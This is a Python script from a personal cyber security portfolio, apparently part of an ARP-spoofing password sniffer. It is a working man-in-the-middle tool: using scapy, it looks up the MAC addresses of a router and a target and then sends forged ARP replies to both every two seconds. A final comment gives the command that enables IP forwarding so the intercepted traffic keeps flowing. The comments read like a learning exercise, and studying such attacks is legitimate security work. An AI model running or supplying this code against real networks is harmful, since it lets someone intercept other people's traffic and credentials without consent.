#Alexandros Darras arpspoofer-password sniffer Cyber Security Portfolio
#                             ,-.
#        ___,---.__          /'|`\          __,---,___
#     ,-'    \`    `-.____,-'  |  `-.____,-'    //    `-.
#   ,'        |           ~'\     /`~           |        `.
#  /      ___//              `. ,'          ,  , \___      \
# |    ,-'   `-.__   _         |        ,    __,-'   `-.    |
# |   /          /\_  `   .    |    ,      _/\          \   |
# \  |           \ \`-.___ \   |   / ___,-'/ /           |  /
#  \  \           | `._   `\\  |  //'   _,' |           /  /
#   `-.\         /'  _ `---'' , . ``---' _  `\         /,-'
#      ``       /     \    ,='/ \`=.    /     \       ''
#              |__   /|\_,--.,-.--,--._/|\   __|
#              /  `./  \\`\ |  |  | /,//' \,'  \
#             /   /     ||--+--|--+-/-|     \   \
#            |   |     /'\_\_\ | /_/_/`\     |   |
#             \   \__, \_     `~'     _/ .__/   /
#              `-._,-'   `-._______,-'   `-._,-'

import scapy.all as scapy
import sys
import time

def get_mac_address(ip_address): #our function that will get the physical addresses of router and target machine using out imported libraries.
        broadcast_layer = scapy.Ether(dst='ff:ff:ff:ff:ff:ff') #we create a boradcast layer(this packet will be sent to all devices in the same physical domain.)
        arp_layer=scapy.ARP(pdst=ip_address) #using a scapy function we create an arp packet and we assign to the pdst the ip address given.
        get_mac_packet=broadcast_layer/arp_layer #we combine the above two packets into one
        answer = scapy.srp(get_mac_packet,timeout=2,verbose=False)[0] # we use the scapy srp function which sends the selected packet and receives the responce,
        return answer[0][1].hwsrc # here we define which item from the lists recorded is the mac address.(.hwsrc is how mac is stored in scapy)



def spoof(router_ip,target_ip,router_mac,target_mac): #this spoofing function will create two packets
                                                        #one sent to the router and one to the target machine
                                                        #and spoof them both at the same time,using again the scapy arp function and the scapy send function.
    packet1=scapy.ARP(op=2,hwdst=router_mac,pdst=router_ip,psrc=target_ip) #this packet will go to the router with a psrc (source will be the targets ip)
    packet2=scapy.ARP(op=2,hwdst=target_mac,pdst=target_ip,psrc=router_ip)#this packet will go to the target with a psrc(source will be the routers ip)
    scapy.send(packet1)
    scapy.send(packet2)

target_ip = str(sys.argv[2])#sys.argv we are storing the third arguement when we run the program which is going to be the
                        #target machines Ip .(0 is the name of the program and 1 the first arguement which is going
                        #to be the ip of the router.

router_ip= str(sys.argv[1])
# example arpspoofer.py 192.168.1.1 192.168.1.2
#then to get the mac addresses of the targets
target_mac=str(get_mac_address(target_ip))
router_mac=str(get_mac_address(router_ip))

print(router_mac)
print(target_mac)

try :  # here we create an infinite loop that will run the spoof() function that we have created until a keyboard interrupt.
       #and then exit the program.
    while True:
        spoof(router_ip,target_ip,router_mac,target_mac)
        time.sleep(2) # a function from the time library, arp will be sent every two seconds to the router and target machine.
except KeyboardInterrupt:
    print('closing arp spoofer.')
    exit(0)

# in order to forward the packets from one target to another we need to run a command inside our terminal before we run our program
# the command is >> :    echo 1 >> /proc/sys/net/ipv4/ip_forward
# you have to be in the domain in which you have saved the program 
